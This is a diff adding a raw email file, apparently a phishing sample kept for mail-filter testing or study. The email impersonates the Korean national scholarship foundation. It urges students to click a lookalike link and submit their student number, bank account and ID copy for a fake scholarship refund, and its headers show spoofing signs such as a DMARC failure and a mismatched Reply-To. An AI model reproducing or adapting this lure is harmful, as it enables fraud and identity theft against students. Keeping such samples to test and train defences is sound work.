@@ -1,0 +1,21 @@
+Return-Path: <no-reply@scholar-fund-2026.info>
+Received: from bulk12.mailsender-pro.info (45.133.1.88)
+	by mx.univ-mail.ac.kr with SMTP; Thu, 13 Aug 2026 21:15:03 +0900
+Authentication-Results: mx.univ-mail.ac.kr;
+	spf=pass smtp.mailfrom=scholar-fund-2026.info;
+	dkim=pass header.d=scholar-fund-2026.info;
+	dmarc=fail (p=none) header.from=univ-scholarship.or.kr
+From: "국가장학재단" <support@univ-scholarship.or.kr>
+Reply-To: <apply@scholar-fund-2026.info>
+To: <student@univ-mail.ac.kr>
+Subject: 선착순 300명 - 2026 특별 생활비 장학금 환급 안내
+Date: Thu, 13 Aug 2026 21:15:00 +0900
+Content-Type: text/html; charset=utf-8
+MIME-Version: 1.0
+
+<html><body>
+<p>축하합니다! 귀하는 <b>특별 생활비 장학금</b> 대상자로 선정되었습니다.</p>
+<p><b>선착순 300명</b>에 한해 최대 200만원을 환급합니다. 마감이 임박했습니다.</p>
+<p>환급 계좌 등록: <a href="http://scholar-fund-2026.info/apply">여기를 클릭</a></p>
+<p>* 신청 시 학번, 계좌번호, 신분증 사본이 필요합니다.</p>
+</body></html>
